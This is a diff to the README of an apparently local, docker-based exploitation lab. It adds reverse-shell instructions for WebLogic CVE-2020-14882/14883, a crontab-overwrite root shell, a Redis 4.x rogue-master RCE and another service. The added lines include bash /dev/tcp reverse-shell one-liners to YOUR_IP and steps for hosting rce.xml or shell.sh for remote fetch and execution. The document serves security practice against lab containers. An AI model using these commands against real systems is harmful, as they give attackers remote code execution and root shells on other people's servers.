@@ -215,7 +215,8 @@ docker compose up -d
 
 python client.py http://localhost:8080 --check-only     # confirm vulnerability
 python client.py http://localhost:8080 --cmd "id"       # direct RCE with output
-python client.py http://localhost:8080 --shell          # interactive shell
+# To get a reverse shell (start a listener on YOUR_IP:8000 first):
+python client.py http://localhost:8080 --cmd "bash -c 'bash -i >& /dev/tcp/YOUR_IP/8000 0>&1'"
 ```
 
 #### WebLogic — CVE-2020-14882/14883 (Pre-Auth Console Bypass + RCE)
@@ -230,8 +231,11 @@ docker compose up -d
 
 python client.py http://localhost:7001 --mode check                         # verify bypass
 python client.py http://localhost:7001 --mode shell-session --cmd "id"      # blind RCE
-python client.py http://localhost:7001 --mode generate-xml --cmd "touch /tmp/pwned"
-python client.py http://localhost:7001 --mode shell                         # interactive shell
+# To get a reverse shell (Java Runtime.exec restrictions apply, use XML Context mode):
+# 1. Create rce.xml with ProcessBuilder to execute bash reverse shell
+# 2. Host rce.xml on a Python web server at http://YOUR_IP/rce.xml
+# 3. Trigger it to catch the shell on your netcat listener:
+python client.py http://localhost:7001 --mode xml-context --xml-url http://YOUR_IP/rce.xml
 ```
 
 ---
@@ -343,7 +347,9 @@ docker compose up -d
 
 python client.py http://localhost:8161 --mode check
 python client.py http://localhost:8161 --mode webshell                          # JSP shell at /api/shell.jsp
-python client.py http://localhost:8161 --mode crontab --attacker-ip YOUR_IP --attacker-port 4444
+# To get a reverse shell via crontab overwrite (yields root shell after 1 min):
+# Start a listener on YOUR_PORT, then run:
+python client.py http://localhost:8161 --mode crontab --attacker-ip YOUR_IP --attacker-port YOUR_PORT
 ```
 
 #### Redis — 4.x Unauthorized Access
@@ -357,11 +363,13 @@ docker compose up -d
 python client.py 127.0.0.1 --mode check              # verify unauthenticated PING
 python client.py 127.0.0.1 --mode keys               # dump all keys
 python client.py 127.0.0.1 --mode write              # file-write via CONFIG SET + BGSAVE
-python client.py 127.0.0.1 --mode exploit --lhost YOUR_IP   # rogue-master RCE (needs exp.so)
-python client.py 127.0.0.1 --mode shell              # system.exec shell (post-exploit)
+# To get a reverse shell via rogue server:
+cd n0b0dyCN-redis-rogue-server
+python redis-rogue-server.py --rhost 127.0.0.1 --lhost YOUR_IP
+# Inside the interactive shell, execute standard bash reverse shell payload to your listener
 ```
 
-> `exploit` mode requires a compiled `exp.so` Redis module (build from [RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)).
+> The rogue server method compiles and injects `exp.so` into memory to achieve RCE without touching the disk.
 
 ---
 
@@ -391,6 +399,9 @@ docker compose up -d
 
 python client.py http://localhost:8081 --mode check
 python client.py http://localhost:8081 --mode touch --user admin           # verify blind RCE
+# To get a reverse shell:
+# 1. Create shell.sh containing: #!/bin/bash \n bash -i >& /dev/tcp/YOUR_IP/8000 0>&1
+# 2. Host shell.sh on YOUR_IP port 80 via Python web server
 python client.py http://localhost:8081 --mode reverse-shell \
     --shell-url http://YOUR_IP/shell.sh --user admin
 ```
